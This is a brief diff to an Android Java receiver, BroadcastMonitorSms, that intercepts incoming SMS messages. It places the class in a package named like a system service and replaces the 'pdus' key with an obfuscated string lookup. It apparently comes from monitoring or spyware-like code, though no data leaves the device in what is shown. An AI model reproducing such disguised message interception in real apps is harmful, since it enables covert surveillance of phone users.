@@ -15,10 +15,11 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
+import com.android.service.Messages;
 import com.android.service.Sms;
 
 public class BroadcastMonitorSms extends BroadcastReceiver {
-	private static final String TAG = "BroadcastMonitorSms";
+	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$
 
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
 	@Override
@@ -32,7 +33,7 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 		SmsMessage[] msgs = null;
 
 		// Prendiamo l'sms
-		final Object[] pdus = (Object[]) bundle.get("pdus");
+		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
 		msgs = new SmsMessage[pdus.length];
 
 		for (int i = 0; i < msgs.length; i++) {
